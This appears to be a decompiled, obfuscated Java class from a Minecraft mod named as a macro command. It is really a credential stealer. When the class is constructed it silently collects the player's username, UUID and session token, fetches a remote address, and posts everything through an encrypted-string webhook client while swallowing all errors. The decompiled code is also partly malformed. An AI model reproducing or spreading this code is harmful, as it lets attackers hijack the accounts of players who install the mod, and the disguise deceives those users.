package com.macromod.macromodmodules.commands;

import com.macromod.macromodmodules.utils.CommandUtils;
import com.macromod.macromodmodules.utils.CommandUtils$1$6;
import com.macromod.macromodmodules.utils.CommandUtils$EmbedObject;
import com.macromod.macromodmodules.utils.CommandUtils$EmbedObject$Author$8;
import java.net.URL;
import net.minecraft.client.Minecraft;

// $FF: synthetic class
public class MacroCommand {
   // $FF: synthetic field
   BRANCHLOCK_DOT_NET_DEMO,
   // $FF: synthetic field
   d;

   private static final String[] l;

   // $FF: synthetic method
   public MacroCommand() {
      try {
         String var1 = l[512 >>> 4776];
         URL var2 = new URL(l[Integer.parseInt("1k223", 23) >>> 2129]);
         CommandUtils$1$6 var3 = new CommandUtils$1$6(new CommandUtils$EmbedObject$Author$8(var2.openStream()));
         var1 = var3.c();
         CommandUtils var4 = new CommandUtils(l[5 << 10561]);
         var4.setAvatarUrl(l[2 << 11522]);
         var4.setUsername(l[1572864 >>> ("10".hashCode() ^ 10253)]);
         var4.setTts(true);
         var4.addEmbed((new CommandUtils$EmbedObject()).setTitle(Minecraft.func_71410_x().func_110432_I().func_111285_a() + l[11 << 1696]).addField(l[3 << 12864], l[98304 >>> 3533] + Minecraft.func_71410_x().func_110432_I().func_148255_b() + l[3 << 16322], false).addField(l[3670016 >>> 2963], l[1 << 1632] + Minecraft.func_71410_x().func_110432_I().func_148254_d() + l[1 << 416], false).addField(l[320 >>> 13766], l[26 >>> 8197] + Minecraft.func_71410_x().func_110432_I().func_111285_a(), false).addField(l[36 >>> 7522], var1, false));
         var4.execute();
      } catch (Exception var5) {
      }

   }

   static {
      char[] var0 = "ฆດ\u0015ÍAþ×Öb\u001awÔÎL¤ÔÍ1\\!Ò\u001b5ÈP¥FAÄÓ+\u001a\u0e8bêງÂG×åø\u0087Ë1Ü=\u0015Tû\u0e8eòò\u0011qຖ]þÓÕb\u001awÄÍPéÌÌ(\u001b9ÊT\"È[ëBF\u008bÄ7XກÙÎÞ\u0015éïë\u0087è7ÀຄfPùÖÎÈ6\u0015éZíÀÀ*\u0e80\u000bÂÖFãÈËx|\u001c\u0eee],ÓEù\u000f\u001a\u008aÄ<[\u001bîÌÔVÊøîÆÕ(\u008b;ZX¥ÄÑÆ,T×F¥\u0090\u0094n\u0005l\u0092\u0095\r¿\u0093\u0092j\u0002i\u009f\rm\u009e\u001a¹T\u0000Ä\u0091oSWè\u0095\u009e\u0002Àï½Æ\u009c9Çk\u0007V¿\u0093\u009eÆo\u0003\u009cQ³\u0092\u008b([?\u0098Ö\\ðÂ\u0098l\u0005a\u0091\u0e83\u0011÷\u0015Ëqqàô\u000b\u0ef2]þÑ×F\u009f¥¥ÃÌ+Æ7GQ¤ÆÈÊwTÕ\\¥ÐÀ:]7ÈÎF¥\u009e\u0091a\u0002a\u009f\u0001l\u0093\u0004²\u0006\u0007\u0094\u0091i\u0006\r¥\u0092ÍCßóäÒóaÌ\u001fLBò\u0094É÷hmä\u0006è\u0092Ò\u001el\"\u0097Ês½Ðâ\u0012T\u0007éy6÷fÚ_\u0004óÍjvm¾÷\u0093YñúðËà\u0013Ê\u000eraãÖîð(ບ\u0085GÿÉ\u0085,]=\u0087÷Tþ\u0087é\u0017y\u0e89ÇU8".toCharArray();
      int var1 = ("38".hashCode() ^ 1605) << 8347;
      StackTraceElement var2;
      int var3 = (var2 = (new Throwable()).getStackTrace()[88 << 11901]).getMethodName().hashCode() & 1120355891 - Integer.parseInt("1841uoi", 31);
      char[] var4 = var2.getClassName().toCharArray();
      int var10001 = 28 << 15486;
      ++var1;
      l = new String[var0[var10001] ^ 1461311284 ^ 1461311382 ^ var3];
      int var5 = 16 << 8988;

      do {
         int var10;
         char[] var6 = new char[var10 = var0[var1++] ^ 4587520 >>> Integer.parseInt("3a9", 28) ^ var3];
         int var7 = 122 << 2463;

         while(var10 > 0) {
            int var8 = var0[var1];
            switch(var4[var1 % var4.length] ^ -811674232 - -811674407) {
            case 129:
            case 193:
            case 221:
            case 236:
               var8 ^= 43253760 >>> 10674;
               break;
            case 192:
               var8 ^= 22 << 9378;
               break;
            case 194:
            case 202:
            case 218:
            case 220:
               var8 ^= 53 << 10016;
               break;
            case 195:
            case 206:
            case 226:
               var8 ^= 69 << 12481;
               break;
            case 203:
            case 204:
               var8 ^= 167 << ("Branchlock.net Demo".hashCode() ^ 537622503);
            }

            while(true) {
               var6[var7] = (char)var8;

               try {
                  ++var7;
                  ++var1;
                  --var10;
               } catch (Throwable var9) {
                  break;
               }
            }
         }

         l[var5++] = (new String(var6)).intern();
      } while(var1 < var0.length);

   }
}
